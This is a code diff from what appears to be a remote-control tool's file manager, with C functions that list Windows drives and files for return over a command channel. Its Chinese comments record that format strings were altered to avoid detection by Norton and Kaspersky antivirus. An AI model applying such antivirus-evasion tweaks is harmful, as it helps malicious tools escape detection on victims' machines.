@@ -4,30 +4,33 @@
 #include <shellapi.h>
 #include "shlwapi.h"
 
+#if _MSC_VER >= 1200
+	#define sprintf sprintf_s
+#endif
+
 void FileListDirver(char *pBuf, LPMsgHead lpMsgHead)
 {
-	DriverInfo driver;
-	DWORD dwLen = 0;
+	DriverInfo Driver;
+	DWORD Offset = 0;
 	SHFILEINFO sfi;
 
-	for (char chDriver = 'B'; chDriver <= 'Z'; chDriver++)
+	for (char chDriver = 'A'; chDriver <= 'Z'; chDriver++)
 	{
-		ZeroMemory(&driver, sizeof(DriverInfo));
-		wsprintf(driver.driver, "%c:\\", chDriver);
-		driver.drivertype = GetDriveTypeA(driver.driver);
-		if (driver.drivertype >= 2) //如驱动器不能识别，则返回0。如指定的目录不存在，则返回1
+		ZeroMemory(&Driver, sizeof(DriverInfo));
+		sprintf(Driver.driver, "%c:\\", chDriver);
+		Driver.drivertype = GetDriveTypeA(Driver.driver);
+		if (Driver.drivertype >= 2) //如驱动器不能识别，则返回0。如指定的目录不存在，则返回1
 		{
-			SHGetFileInfo(driver.driver, 0, &sfi, sizeof(sfi), SHGFI_DISPLAYNAME);
-			lstrcpy(driver.display, sfi.szDisplayName);
+			SHGetFileInfo(Driver.driver, 0, &sfi, sizeof(sfi), SHGFI_DISPLAYNAME);
+			lstrcpy(Driver.display, sfi.szDisplayName);
 
-			//写入缓冲区
-			memcpy(pBuf + dwLen, &driver, sizeof(DriverInfo));
-			dwLen += sizeof(DriverInfo);
+			memcpy(pBuf + Offset, &Driver, sizeof(DriverInfo));
+			Offset += sizeof(DriverInfo);
 		}
 	}
 
 	lpMsgHead->dwCmd = CMD_SUCCEED;
-	lpMsgHead->dwSize = dwLen;
+	lpMsgHead->dwSize = Offset;
 }
 
 //枚举文件路径
@@ -67,12 +70,12 @@ void FileListDirectory(char *pBuf, LPMsgHead lpMsgHead)
 
 		//写入文件信息结构
 		ZeroMemory(&m_FileInfo, sizeof(FileInfo));
-		lstrcpyn(m_FileInfo.cFileName, WFD.cFileName, 64);							  //文件名
+		lstrcpyn(m_FileInfo.cFileName, WFD.cFileName, 64);	//文件名
 
 		if (WFD.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) //And Operate
 		{
-			m_FileInfo.iType = 1;													//目录
-			//lstrcpy(m_FileInfo.cAttrib, "文件夹");								  //文件属性
+			m_FileInfo.iType = 1;	//目录
+			//lstrcpy(m_FileInfo.cAttrib, "文件夹");		//文件属性
 		}
 		else
 		{
@@ -83,13 +86,13 @@ void FileListDirectory(char *pBuf, LPMsgHead lpMsgHead)
 			{
 				sprintf(m_FileInfo.cSize, "%-4.2f GB", (float)WFD.nFileSizeHigh * 4 + (float)dwSize / 1024 / 1024 / 1024);
 			}
-			else if (dwSize < 1024)//这个格式化的字符串被诺顿杀了，所以KB前2个空格
+			else if (dwSize < 1024)
 				sprintf(m_FileInfo.cSize, "%-4d B", dwSize);
 			else if (dwSize > 1024 && dwSize < 1024 * 1024)
-				sprintf(m_FileInfo.cSize, "%-4.2f KB", (float)dwSize / 1024);
+				sprintf(m_FileInfo.cSize, "%-4.2f KB", (float)dwSize / 1024); //这个格式化的字符串被诺顿杀了，所以KB前2个空格
 			else if (dwSize > 1024 * 1024 && dwSize < 1024 * 1024 * 1024)
 				sprintf(m_FileInfo.cSize, "%-4.2f MB", (float)dwSize / 1024 / 1024);
-			else//被卡巴杀，只能这么搞了
+			else
 				sprintf(m_FileInfo.cSize, "Unknown");
 
 			lstrcpy(m_FileInfo.cAttrib, shfi.szTypeName); //文件属性
